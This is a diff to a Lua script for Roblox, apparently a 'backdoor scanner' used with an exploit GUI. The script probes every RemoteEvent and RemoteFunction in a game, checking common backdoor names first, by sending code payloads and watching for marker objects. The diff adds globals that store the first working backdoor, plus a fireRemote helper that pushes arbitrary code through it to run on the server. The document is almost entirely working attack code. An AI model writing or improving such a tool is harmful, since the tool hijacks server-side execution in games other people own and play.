@@ -2,6 +2,9 @@ local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p
                   'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9'}
 
 _G.backdoors = {}
+_G.backdoor = nil
+_G.backdoorPath = nil
+_G.fireRemote = nil
 
 local function generateName(len)
     local name = ""
@@ -38,6 +41,7 @@ local function testPayload(remote, code)
         task.wait()
     end
 
+    -- Extra attempts for RemoteFunctions with different argument styles
     if remote:IsA("RemoteFunction") then
         task.spawn(function()
             pcall(function()
@@ -57,6 +61,7 @@ local function scan()
     _G.backdoors = {}
     local tests = {}
 
+    -- Common backdoor names (tested first for speed)
     local commonNames = {
         "MainRemote", "Remote", "Execute", "Server", "Backdoor", "lh",
         tostring(game.PlaceId * 1337),
@@ -75,6 +80,7 @@ local function scan()
         end
     end
 
+    -- Scan all remotes
     for _, remote in ipairs(game:GetDescendants()) do
         if not (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then continue end
 
@@ -91,7 +97,8 @@ local function scan()
         tests[code] = {remote = remote, path = fullName}
     end
 
-    for i = 1, 200 do
+    -- Check for markers over time (increased for delayed backdoors)
+    for i = 1, 300 do
         for code, info in pairs(tests) do
             local marker = workspace:FindFirstChild(code)
             if marker then
@@ -99,8 +106,33 @@ local function scan()
                 table.insert(_G.backdoors, {remote = info.remote, path = info.path})
             end
         end
-        task.wait(0.05)
+        task.wait(0.07)
     end
+
+    -- === CRITICAL FIX: Set the globals your GUI expects ===
+    if #_G.backdoors > 0 then
+        local found = _G.backdoors[1]  -- Use the first detected (usually fastest)
+        _G.backdoor = found.remote
+        _G.backdoorPath = found.path
+
+        _G.fireRemote = function(remote, code)
+            if remote:IsA("RemoteEvent") then
+                remote:FireServer(code)
+            elseif remote:IsA("RemoteFunction") then
+                task.spawn(function()
+                    pcall(function()
+                        remote:InvokeServer(code)
+                    end)
+                end)
+            end
+        end
+
+        print("FZ Scanner: Successfully attached to backdoor at " .. found.path)
+        print("Total backdoors found: " .. #_G.backdoors)
+    else
+        print("FZ Scanner: No backdoor found")
+    end
+    -- === END OF FIX ===
 end
 
 task.spawn(scan)
